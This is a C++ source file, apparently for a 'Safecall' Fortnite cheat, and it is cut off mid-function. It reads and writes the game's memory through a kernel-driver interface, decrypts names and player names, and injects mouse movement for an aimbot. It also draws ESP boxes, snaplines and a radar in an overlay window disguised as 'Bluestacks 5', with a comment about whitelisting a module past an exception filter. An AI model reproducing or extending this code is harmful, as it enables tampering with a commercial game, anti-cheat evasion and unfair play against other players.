#include "ue5_includes.h"
#include "ue5_offsets.h"
#include "ue5_d3d9/d3dx9math.h"
#include "ue5_defs.h"
#include "ue5_settings.h"
#include "ue5_encrypt.h"
#include "ue5_lib.hpp"
#include "ue5_render/imgui_impl_win32.h"
#include <dwmapi.h>
#include "C:/Program Files/Microsoft Visual Studio/2022/Community/VC/Tools/MSVC/14.33.31629/include/thread"
#pragma comment (lib, "dwmapi.lib")

static void xShutdown();
static LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
static HWND Window = NULL;
IDirect3D9Ex* p_Object = NULL;
static LPDIRECT3DDEVICE9 D3dDevice = NULL;
static LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;
RECT GameRect = { NULL };
D3DPRESENT_PARAMETERS d3dpp;
MSG Message = { NULL };
const MARGINS Margin = { -1 };
HWND game_wnd;
int screen_width;
int screen_height;

template <typename T>
T read(const uintptr_t address)
{
	T buffer{ };
	Comms::ReadProcessMemory(UDPID, address, (uint8_t*)&buffer, sizeof(T));
	return buffer;
}

template <typename T>
void write(const uintptr_t address, T value)
{
	Comms::WriteProcessMemory(UDPID, address, (uint8_t*)&value, sizeof(T));
}

std::string read_buffer(uintptr_t Address, void* Buffer, SIZE_T Size)
{

}

namespace addresses
{
	DWORD_PTR uworld;
	DWORD_PTR owninggameinstance;
	DWORD_PTR localplayers;
	DWORD_PTR localplayer;
	DWORD_PTR playercontroller;
	uint64_t playercameramanager;
	DWORD_PTR localpawn;
	DWORD_PTR playerstate;
	DWORD_PTR rootcomponent;
	DWORD_PTR persistentlevel;
	DWORD actorcount;
	DWORD_PTR aactors;
	DWORD_PTR currentactor;
	int currentactorid;
	int curactorid;
	uint64_t currentactormesh;
	Vector3 realativelocations;
	uint64_t worldsettings;
	uint64_t EnemyPlayerState;
}

typedef struct _FNlEntity {
	uint64_t Actor;
	int ID;
	uint64_t mesh;

}FNlEntity;

struct Camera
{
	Vector3 Location;
	Vector3 Rotation;
	float FieldOfView;
}; Camera vCamera;

namespace CachedCamera {
	double Pitch;
	double Yaw;
	Vector3 location;
	uintptr_t ptr;
	float FieldOfView;
}

////////////////////////////////////////////////////////
std::vector<_FNlEntity> entityList;
std::vector<_FNlEntity> itemslist;
/// //////////////////////////////////////////////////

D3DMATRIX matrixx(D3DMATRIX pM1, D3DMATRIX pM2)
{
	D3DMATRIX pOut;
	pOut._11 = pM1._11 * pM2._11 + pM1._12 * pM2._21 + pM1._13 * pM2._31 + pM1._14 * pM2._41;
	pOut._12 = pM1._11 * pM2._12 + pM1._12 * pM2._22 + pM1._13 * pM2._32 + pM1._14 * pM2._42;
	pOut._13 = pM1._11 * pM2._13 + pM1._12 * pM2._23 + pM1._13 * pM2._33 + pM1._14 * pM2._43;
	pOut._14 = pM1._11 * pM2._14 + pM1._12 * pM2._24 + pM1._13 * pM2._34 + pM1._14 * pM2._44;
	pOut._21 = pM1._21 * pM2._11 + pM1._22 * pM2._21 + pM1._23 * pM2._31 + pM1._24 * pM2._41;
	pOut._22 = pM1._21 * pM2._12 + pM1._22 * pM2._22 + pM1._23 * pM2._32 + pM1._24 * pM2._42;
	pOut._23 = pM1._21 * pM2._13 + pM1._22 * pM2._23 + pM1._23 * pM2._33 + pM1._24 * pM2._43;
	pOut._24 = pM1._21 * pM2._14 + pM1._22 * pM2._24 + pM1._23 * pM2._34 + pM1._24 * pM2._44;
	pOut._31 = pM1._31 * pM2._11 + pM1._32 * pM2._21 + pM1._33 * pM2._31 + pM1._34 * pM2._41;
	pOut._32 = pM1._31 * pM2._12 + pM1._32 * pM2._22 + pM1._33 * pM2._32 + pM1._34 * pM2._42;
	pOut._33 = pM1._31 * pM2._13 + pM1._32 * pM2._23 + pM1._33 * pM2._33 + pM1._34 * pM2._43;
	pOut._34 = pM1._31 * pM2._14 + pM1._32 * pM2._24 + pM1._33 * pM2._34 + pM1._34 * pM2._44;
	pOut._41 = pM1._41 * pM2._11 + pM1._42 * pM2._21 + pM1._43 * pM2._31 + pM1._44 * pM2._41;
	pOut._42 = pM1._41 * pM2._12 + pM1._42 * pM2._22 + pM1._43 * pM2._32 + pM1._44 * pM2._42;
	pOut._43 = pM1._41 * pM2._13 + pM1._42 * pM2._23 + pM1._43 * pM2._33 + pM1._44 * pM2._43;
	pOut._44 = pM1._41 * pM2._14 + pM1._42 * pM2._24 + pM1._43 * pM2._34 + pM1._44 * pM2._44;

	return pOut;
}

void aimbot(float x, float y)
{
	float ScreenCenterX = (Width / 2);
	float ScreenCenterY = (Height / 2);
	int AimSpeed = settings::smooth;
	float TargetX = 0;
	float TargetY = 0;

	if (x != 0)
	{
		if (x > ScreenCenterX)
		{
			TargetX = -(ScreenCenterX - x);
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
		}

		if (x < ScreenCenterX)
		{
			TargetX = x - ScreenCenterX;
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX < 0) TargetX = 0;
		}
	}

	if (y != 0)
	{
		if (y > ScreenCenterY)
		{
			TargetY = -(ScreenCenterY - y);
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
		}

		if (y < ScreenCenterY)
		{
			TargetY = y - ScreenCenterY;
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY < 0) TargetY = 0;
		}
	}

	SonyDriverHelper::api::MouseMove(TargetX, TargetY);

	return;
}

D3DXMATRIX Matrix(Vector3 rot, Vector3 origin = Vector3(0, 0, 0))
{
	float radPitch = (rot.x * float(M_PI) / 180.f);
	float radYaw = (rot.y * float(M_PI) / 180.f);
	float radRoll = (rot.z * float(M_PI) / 180.f);

	float SP = sinf(radPitch);
	float CP = cosf(radPitch);
	float SY = sinf(radYaw);
	float CY = cosf(radYaw);
	float SR = sinf(radRoll);
	float CR = cosf(radRoll);

	D3DMATRIX matrix;
	matrix.m[0][0] = CP * CY;
	matrix.m[0][1] = CP * SY;
	matrix.m[0][2] = SP;
	matrix.m[0][3] = 0.f;

	matrix.m[1][0] = SR * SP * CY - CR * SY;
	matrix.m[1][1] = SR * SP * SY + CR * CY;
	matrix.m[1][2] = -SR * CP;
	matrix.m[1][3] = 0.f;

	matrix.m[2][0] = -(CR * SP * CY + SR * SY);
	matrix.m[2][1] = CY * SR - CR * SP * SY;
	matrix.m[2][2] = CR * CP;
	matrix.m[2][3] = 0.f;

	matrix.m[3][0] = origin.x;
	matrix.m[3][1] = origin.y;
	matrix.m[3][2] = origin.z;
	matrix.m[3][3] = 1.f;

	return matrix;
}


FTransform GetBoneIndex(DWORD_PTR mesh, int index)
{
	DWORD_PTR bonearray;
	bonearray = read<DWORD_PTR>(mesh + 0x5b8);

	if (bonearray == NULL)
	{
		bonearray = read<DWORD_PTR>(mesh + 0x5b8 + 0x10);  //(mesh + 0x5e8) + 0x5a));
	}
	return read<FTransform>(bonearray + (index * 0x60));
}

Vector3 GetBoneWithRotation(DWORD_PTR mesh, int id)
{
	FTransform bone = GetBoneIndex(mesh, id);
	FTransform ComponentToWorld = read<FTransform>(mesh + 0x240);

	D3DMATRIX Matrix;
	Matrix = MatrixMultiplication(bone.ToMatrixWithScale(), ComponentToWorld.ToMatrixWithScale());

	return Vector3(Matrix._41, Matrix._42, Matrix._43);
}

bool isVisible(uint64_t mesh)
{
	float tik = read<float>(mesh + 0x330);
	float tok = read<float>(mesh + 0x334);
	const float tick = 0.06f;
	return tok + tick >= tik;

}

Camera GetCamera(__int64 a1)
{
	Camera FGC_Camera;
	__int64 v1;
	__int64 v6;
	__int64 v7;
	__int64 v8;

	v1 = read<__int64>(addresses::localplayer + 0xd0);
	__int64 v9 = read<__int64>(v1 + 0x8); // 0x10

	FGC_Camera.FieldOfView = 80.f / (read<double>(v9 + 0x620) / 1.19f); // 0x600

	FGC_Camera.Rotation.x = read<double>(v9 + 0x870);
	FGC_Camera.Rotation.y = read<double>(a1 + 0x148);

	uint64_t FGC_Pointerloc = read<uint64_t>(addresses::uworld + 0x110);
	FGC_Camera.Location = read<Vector3>(FGC_Pointerloc);

	return FGC_Camera;
}

Vector3 ProjectWorldToScreen(Vector3 WorldLocation)
{
	Camera vCamera = GetCamera(addresses::rootcomponent);
	vCamera.Rotation.x = (asin(vCamera.Rotation.x)) * (180.0 / M_PI);
	Vector3 Camera;

	D3DMATRIX tempMatrix = Matrix(vCamera.Rotation);

	Vector3 vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	Vector3 vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	Vector3 vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	Vector3 vDelta = WorldLocation - vCamera.Location;
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	//float EncryptedFOV = read<float>(addresses::playercontroller + 0x374);
	//settings::CachedFOV = EncryptedFOV * 90;
	//float FovAngle = settings::CachedFOV;

	return Vector3((Width / 2.0f) + vTransformed.x * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, (Height / 2.0f) - vTransformed.y * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, 0);
}

static std::string ReadGetNameFromFName(int key) {
	uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
	uint16_t NameOffset = (uint16_t)key;

	uint64_t NamePoolChunk = read<uint64_t>(baseaddy + 0xe145cc0 + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset);
	uint16_t nameEntry = read<uint16_t>(NamePoolChunk);

	int nameLength = nameEntry >> 6;
	char buff[1024];
	if ((uint32_t)nameLength)
	{
		for (int x = 0; x < nameLength; ++x)
		{
			buff[x] = read<char>(NamePoolChunk + 4 + x);
		}

		char* v2 = buff; // rdi 
		__int64 result; // rax 
		unsigned int v5 = nameLength; // ecx 
		__int64 v6; // r8 
		char v7; // cl 
		unsigned int v8; // eax 

		result = 22i64;
		if (v5)
		{
			v6 = v5;
			do
			{
				v7 = *v2++;
				v8 = result + 45297;
				*(v2 - 1) = v8 + ~v7;
				result = (v8 << 8) | (v8 >> 8);
				--v6;
			} while (v6);
		}

		buff[nameLength] = '\0';
		return std::string(buff);
	}
	else {
		return "";
	}
}


static std::string GetNameFromFName(int key)
{
	uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
	uint16_t NameOffset = (uint16_t)key;

	uint64_t NamePoolChunk = read<uint64_t>(baseaddy + 0xe145cc0 + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset); //((ChunkOffset + 2) * 8) ERROR_NAME_SIZE_EXCEEDED
	if (read<uint16_t>(NamePoolChunk) < 64)
	{
		auto a1 = read<DWORD>(NamePoolChunk + 4);
		return ReadGetNameFromFName(a1);
	}
	else
	{
		return ReadGetNameFromFName(key);
	}
}

std::string decrypt_player_name(uintptr_t PlayerState)
{
	int pNameLength; // rsi
	_WORD* pNameBufferPointer;
	int i; // ecx
	char v25; // al
	int v26; // er8
	int v29; // eax

	uintptr_t pNameStructure = read<uintptr_t>(PlayerState + 0xB08);
	pNameLength = read<int>(pNameStructure + 0x10);
	if (pNameLength <= 0) return "";

	wchar_t* pNameBuffer = new wchar_t[pNameLength];
	uintptr_t pNameEncryptedBuffer = read<uintptr_t>(pNameStructure + 0x8);
	Comms::ReadProcessMemory(UDPID, pNameEncryptedBuffer, pNameBuffer, pNameLength * sizeof(wchar_t));

	v25 = pNameLength - 1;
	v26 = 0;
	pNameBufferPointer = (_WORD*)pNameBuffer;

	for (i = (v25) & 3; ; *pNameBufferPointer++ += i & 7)
	{
		v29 = pNameLength - 1;
		if (!(_DWORD)pNameLength)
			v29 = 0;

		if (v26 >= v29)
			break;

		i += 3;
		++v26;
	}

	std::wstring temp_wstring(pNameBuffer);
	return std::string(temp_wstring.begin(), temp_wstring.end());
}

DWORD_PTR NameActor;
void actorloop()
{
	while (true)
	{
		std::vector<FNlEntity> Players;
		read<uintptr_t>(baseaddy + 0x0060); // trigger veh set - add module to whitelist filter

		addresses::uworld = read<DWORD_PTR>(baseaddy + 0xe11fdc8);
		addresses::owninggameinstance = read<DWORD_PTR>(addresses::uworld + 0x1b8);
		addresses::localplayers = read<DWORD_PTR>(addresses::owninggameinstance + 0x38);
		addresses::localplayer = read<DWORD_PTR>(addresses::localplayers); 
		addresses::playercontroller = read<DWORD_PTR>(addresses::localplayer + 0x30);
		addresses::playercameramanager = read<uint16_t>(addresses::playercontroller + 0x340);
		addresses::localpawn = read<DWORD_PTR>(addresses::playercontroller + 0x330);

		addresses::playerstate = read<DWORD_PTR>(addresses::localpawn + 0x2a8);
		addresses::rootcomponent = read<DWORD_PTR>(addresses::localpawn + 0x190);
		addresses::realativelocations = read<Vector3>(addresses::rootcomponent + 0x128);
		addresses::persistentlevel = read<DWORD_PTR>(addresses::uworld + 0x30);
		addresses::worldsettings = read<uint64_t>(addresses::persistentlevel + 0x298);
		addresses::actorcount = read<DWORD>(addresses::persistentlevel + 0xA0);
		addresses::aactors = read<DWORD_PTR>(addresses::persistentlevel + 0x98);

		for (int i = 0; i < addresses::actorcount; ++i)
		{
			DWORD_PTR CurrentActor = read<DWORD_PTR>(addresses::aactors + i * 0x8);
			auto CurrentActors = read<uintptr_t>(CurrentActor + 0x300);//PawnPrivate
			DWORD64 otherPlayerState = read<uint64_t>(CurrentActor + 0x290);
			int CurrentActorId = read<int>(CurrentActor + 0x18);
			addresses::EnemyPlayerState = read<uint64_t>(CurrentActors + 0x290);

			float dbno_check = read<float>(CurrentActor + 0x4250);
			if (dbno_check == 10)
			{
				uint64_t currentactormesh = read<uint16_t>(CurrentActor + 0x310);
				int curactorid = read<int>(CurrentActor + 0x18);

				FNlEntity fnlEntity{ };
				fnlEntity.Actor = CurrentActor;
				fnlEntity.mesh = currentactormesh;
				fnlEntity.ID = curactorid;

				Players.push_back(fnlEntity);
			}
		}
		entityList.clear();
		entityList = Players;
		std::this_thread::sleep_for(std::chrono::milliseconds(1));
	}
}

void setup_window()
{
	WNDCLASSEX win_class = {
		sizeof(WNDCLASSEX),
		0,
		WinProc,
		0,
		0,
		nullptr,
		LoadIcon(nullptr, IDI_APPLICATION),
		LoadCursor(nullptr, IDC_ARROW),
		nullptr,
		nullptr,
		TEXT("Bluestacks 5"),
		LoadIcon(nullptr, IDI_APPLICATION)
	};

	if (!RegisterClassEx(&win_class))
		exit(1);

	game_wnd = FindWindowW(NULL, TEXT("Fortnite  "));

	if (game_wnd) {
		screen_width = 1900;
		screen_height = 1070;
	}
	else
		exit(2);

	Window = CreateWindowExA(NULL, "Bluestacks 5", "Bluestacks 5", WS_POPUP | WS_VISIBLE, Width + 10, Height + 5, screen_width, screen_height, NULL, NULL, 0, NULL);
	DwmExtendFrameIntoClientArea(Window, &Margin);
	SetWindowLong(Window, GWL_EXSTYLE, (int)GetWindowLong(Window, GWL_EXSTYLE) | WS_EX_LAYERED | WS_EX_TRANSPARENT);
	SetLayeredWindowAttributes(Window, RGB(0, 0, 0), 0, ULW_COLORKEY);
	SetLayeredWindowAttributes(Window, 0, 255, LWA_ALPHA);
	ShowWindow(Window, SW_SHOW);
	UpdateWindow(Window);
}


void xInitD3d()
{
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&d3dpp, sizeof(d3dpp));
	d3dpp.BackBufferWidth = Width;
	d3dpp.BackBufferHeight = Height;
	d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
	d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
	d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
	d3dpp.EnableAutoDepthStencil = TRUE;
	d3dpp.hDeviceWindow = Window;
	d3dpp.Windowed = TRUE;

	p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);

	IMGUI_CHECKVERSION();

	ImGui::CreateContext();

	ImGui_ImplWin32_Init(Window);
	ImGui_ImplDX9_Init(D3dDevice);

	auto& style = ImGui::GetStyle();
	ImGuiIO& io = ImGui::GetIO(); (void)io;

	//style.WindowMinSize = ImVec2(620, 450);

	style.FrameBorderSize = 0;
	//style.WindowPadding = ImVec2(2, 2);
	style.WindowRounding = 0;
	style.WindowPadding = ImVec2(10, 10);
	style.TabRounding = 0;
	style.ScrollbarRounding = 1;
	style.FramePadding = ImVec2(0.3, 0.3);
	style.WindowTitleAlign = ImVec2(0.0f, 0.5f);
	style.ChildRounding = 0;
	style.FrameRounding = 0;
	style.WindowBorderSize = 0;
	style.GrabRounding = 0;
	//style.GrabMinSize = 4;

	style.Colors[ImGuiCol_TitleBg] = ImColor(0, 0, 0, 255);
	style.Colors[ImGuiCol_TitleBgActive] = ImColor(0, 0, 0, 255);
	style.Colors[ImGuiCol_TitleBgCollapsed] = ImColor(0, 0, 0, 255);

	style.Colors[ImGuiCol_Border] = ImColor(154, 154, 154, 255);
	style.Colors[ImGuiCol_WindowBg] = ImColor(255, 255, 255, 255);
	style.Colors[ImGuiCol_ChildBg] = ImColor(255, 255, 255, 255);

	style.Colors[ImGuiCol_CheckMark] = ImColor(0, 0, 0, 255);

	style.Colors[ImGuiCol_FrameBg] = ImColor(216, 216, 216, 255);
	style.Colors[ImGuiCol_FrameBgActive] = ImColor(216, 216, 216, 255);
	style.Colors[ImGuiCol_FrameBgHovered] = ImColor(216, 216, 216, 255);

	style.Colors[ImGuiCol_Header] = ImColor(54, 56, 54, 255);
	style.Colors[ImGuiCol_HeaderActive] = ImColor(54, 56, 54, 255);
	style.Colors[ImGuiCol_HeaderHovered] = ImColor(54, 56, 54, 255);

	style.Colors[ImGuiCol_SliderGrab] = ImColor(0, 0, 0, 255);
	style.Colors[ImGuiCol_SliderGrabActive] = ImColor(0, 0, 0, 255);

	style.Colors[ImGuiCol_Separator] = ImColor(54, 54, 54, 0);
	style.Colors[ImGuiCol_SeparatorActive] = ImColor(54, 54, 54, 0);
	style.Colors[ImGuiCol_SeparatorHovered] = ImColor(54, 54, 54, 0);

	style.Colors[ImGuiCol_Text] = ImColor(0, 0, 0, 255);
	style.Colors[ImGuiCol_TextDisabled] = ImColor(0, 0, 0, 255);

	style.Colors[ImGuiCol_PopupBg] = ImColor(102, 102, 102, 255);

	ImGui::GetIO().Fonts->AddFontFromFileTTF(_("C:\\Windows\\Fonts\\Tahoma.ttf"), 15);


	p_Object->Release();
}

void DrawRadar()
{
	ImGuiStyle& style = ImGui::GetStyle();
	ImVec2 oldPadding = style.WindowPadding;
	style.WindowPadding = ImVec2(0, 0);
	//std::cout << "Vakks";
	ImGui::PushStyleColor(ImGuiCol_WindowBg, ImColor(0, 0, 0, 255).Value);
	ImGui::Begin((" RADAR "), &settings::radar, ImVec2(200, 200), 0.7f, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoTitleBar);
	{
		ImVec2 siz = ImGui::GetWindowSize();
		ImVec2 pos = ImGui::GetWindowPos();


		ImDrawList* windowDrawList = ImGui::GetWindowDrawList();
		windowDrawList->AddLine(ImVec2(pos.x + (siz.x / 2), pos.y + 0), ImVec2(pos.x + (siz.x / 2), pos.y + siz.y), ImColor(255, 255, 255), 1.5f);
		windowDrawList->AddLine(ImVec2(pos.x + 0, pos.y + (siz.y / 2)), ImVec2(pos.x + siz.x, pos.y + (siz.y / 2)), ImColor(255, 255, 255), 1.5f);

		auto itemListCopy = itemslist;

		for (FNlEntity entity : entityList)
		{
			uint64_t rootcomponent = read<uint64_t>(entity.Actor + 0x190);
			if (!rootcomponent)continue;

			Vector3 Relativelocation = read<Vector3>(rootcomponent + 0x128);
			if (!IsVec3Valid(Relativelocation))continue;

			bool viewCheck = false;
			Vector3 EntityPos = RotatePoint(Relativelocation, addresses::realativelocations, pos.x, pos.y, siz.x, siz.y, zoom, 2, &viewCheck);

			int s = 4;
			if (settings::radars::boxradar)
			{

				windowDrawList->AddRect(ImVec2(EntityPos.x - s, EntityPos.y - s),
					ImVec2(EntityPos.x + s, EntityPos.y + s),
					0xFFFFFFFF);
			}
			if (settings::radars::filledboxradar)
			{
				windowDrawList->AddRectFilled(ImVec2(EntityPos.x - s, EntityPos.y - s),
					ImVec2(EntityPos.x + s, EntityPos.y + s),
					0xFFFFFFFF);
			}
		}
	}
	ImGui::PopStyleColor();
	ImGui::End();
	style.WindowPadding = oldPadding;
}

void DrawCorneredBox(int X, int Y, int W, int H, const ImU32& color, int thickness) {
	float lineW = (W / 3);
	float lineH = (H / 3);

	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);

	//corners
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
}

void DrawFilledRect(int x, int y, int w, int h, RGBA* color)
{
	ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(x, y), ImVec2(x + w, y + h), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), 0, 0);
}

void DrawString(float fontSize, int x, int y, RGBA* color, bool bCenter, bool stroke, const char* pText, ...)
{
	va_list va_alist;
	char buf[1024] = { 0 };
	va_start(va_alist, pText);
	_vsnprintf_s(buf, sizeof(buf), pText, va_alist);
	va_end(va_alist);
	std::string text = WStringToUTF8(MBytesToWString(buf).c_str());
	if (bCenter)
	{
		ImVec2 textSize = ImGui::CalcTextSize(text.c_str());
		x = x - textSize.x / 4;
		y = y - textSize.y;
	}
	if (stroke)
	{
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
	}
	ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 153.0, color->B / 51.0, color->A / 255.0)), text.c_str());
}

void fovcircle(int x, int y, int radius, ImU32 color, int segments, float thickness)
{
	ImGui::GetOverlayDrawList()->AddCircle(ImVec2(x, y), radius, color, segments, thickness);
}

void DrawText1(int x, int y, const char* str, RGBA* color)
{
	ImFont a;
	std::string utf_8_1 = std::string(str);
	std::string utf_8_2 = string_To_UTF8(utf_8_1);
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), utf_8_2.c_str());
}


void renderloop()
{
	ImGui::GetOverlayDrawList()->AddText(ImVec2(20, 100), ImColor(255, 255, 0), _("Safecall Fortnite | discord.gg/safecall"));


	if (settings::fovcircle)
	{
		fovcircle(Width / 2, Height / 2, settings::aimfov, ImColor(0, 255, 255), 1000, 2.5f);
	}



	float closestDistance = FLT_MAX;
	for (FNlEntity entity : entityList)
	{
		uintptr_t mesh = read<uintptr_t>(entity.Actor + 0x310);
		Vector3 Headpose = GetBoneWithRotation(mesh, 68);
		Vector3 bone00 = GetBoneWithRotation(mesh, 0);
		Vector3 bottome = ProjectWorldToScreen(bone00);
		Vector3 Headboxe = ProjectWorldToScreen(Vector3(Headpose.x, Headpose.y, Headpose.z + 15));
		Vector3 w2sheade = ProjectWorldToScreen(Headpose);
		Vector3 vHeadBone = GetBoneWithRotation(mesh, 68);
		Vector3 vRootBone = GetBoneWithRotation(mesh, 0);
		Vector3 vHeadBoneOut = ProjectWorldToScreen(Vector3(vHeadBone.x, vHeadBone.y, vHeadBone.z + 15));
		Vector3 vRootBoneOut = ProjectWorldToScreen(vRootBone);

		float distance = addresses::realativelocations.Distance(Headpose) / 100.f;

		float BoxHeight = abs(Headboxe.y - bottome.y);
		float BoxWidth = BoxHeight * 0.60;
		float LeftX = (float)Headboxe.x - (BoxWidth / 1);
		float LeftY = (float)bottome.y;
		float Height1 = abs(Headboxe.y - bottome.y);
		float Width1 = Height1 * 0.90;
		float CornerHeight = abs(Headboxe.y - bottome.y);
		float CornerWidth = CornerHeight * 0.5f;

		uintptr_t ActorState = read<uintptr_t>(entity.Actor + 0x290);
		uint64_t CurrentVehicle = read<uint64_t>(addresses::localpawn + 0x2310); //FortPlayerPawn::CurrentVehicle
		uintptr_t CurrentWeapon = read<uintptr_t>(addresses::localpawn + 0x868); //FortPawn::CurrentWeapon 0x868

		auto UCharacterMovementComponent = read<uintptr_t>(addresses::localpawn + 0x318); //DefaultPawn::MovementComponet
		if (!UCharacterMovementComponent) continue;

		if (entity.Actor == addresses::localpawn) continue;

		auto dx = w2sheade.x - (Width / 2);
		auto dy = w2sheade.y - (Height / 2);
		auto dist = sqrtf(dx * dx + dy * dy);

		if (dist < settings::aimfov && dist < closestDistance) {
			closestDistance = dist;
			closestPawn = entity.Actor;
		}


		if (settings::exploits)
		{

		}

		if (settings::Esp | InLobby)
		{

			if (settings::playernames)
			{
				std::string namedecrypted = decrypt_player_name(addresses::EnemyPlayerState);
				DrawString(15, Headboxe.x, Headboxe.y - 20, &Col.white, true, true, namedecrypted.c_str());
			}

			if (settings::corner)
			{
				DrawCorneredBox(bottome.x - (BoxWidth / 2), Headboxe.y, BoxWidth, BoxHeight, ImColor(255, 255, 255), 2.5);
			}

			if (settings::distance)
			{
				char name[64];
				sprintf_s(name, "[%2.fm]", distance);
				DrawString(13, Headboxe.x, Headboxe.y - 15, &Col.SilverWhite, true, true, name);
			}

			if (settings::snaplines)
			{
				ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height - Height), ImVec2(Headboxe.x, Headboxe.y), ImColor(255, 0, 0), 0.5);
			}

			if (settings::box)
			{
				if (!isVisible(entity.mesh))
				{
					// rgba(0, 255, 231, 0)
